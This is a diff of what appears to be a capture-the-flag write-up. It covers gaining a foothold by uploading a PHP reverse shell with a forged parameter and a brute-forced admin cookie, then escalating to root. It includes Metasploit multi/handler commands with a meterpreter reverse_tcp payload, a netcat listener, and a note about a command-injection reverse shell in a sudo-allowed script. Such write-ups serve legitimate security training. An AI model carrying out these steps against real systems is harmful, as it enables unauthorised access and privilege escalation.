@@ -26,36 +26,51 @@ Found:
 
 Inside /ajax.php.bak:
 Learned about admin cookie requirement
+
 Extra uppercase letter needed at end
+
 New POST param secure=val1d required
 
 ##  Foothold
 Used BurpSuite to modify upload request:
 Added secure=val1d
+
 Appended valid admin cookie (bruteforced with Burp Intruder)
+
 Uploaded PHP reverse shell to /owls
 
 Used Metasploit handler to catch shell:
+
 msfconsole
+
 use exploit/multi/handler
+
 set payload php/meterpreter/reverse_tcp
+
 set LHOST <attacker-ip>
+
 set LPORT <attacker-port>
+
 exploit
+
 ✅ Gained access as www-data
 
 ##  Privilege Escalation
 Step 1 — www-data → athena
+
 Found /home/athena/password-reminder.txt
+
 Contained plaintext password
 
 Switched user:
 su athena
 
 Step 2 — athena → root
+
 sudo -l showed athena could run /home/team-tasks/cookie-gen.py as root
 
 Script vulnerable to command injection: Injected reverse shell;
+
 caught with netcat on attacker terminal: nc -lvnp <attacker-port>
 
 ✅ Root shell obtained
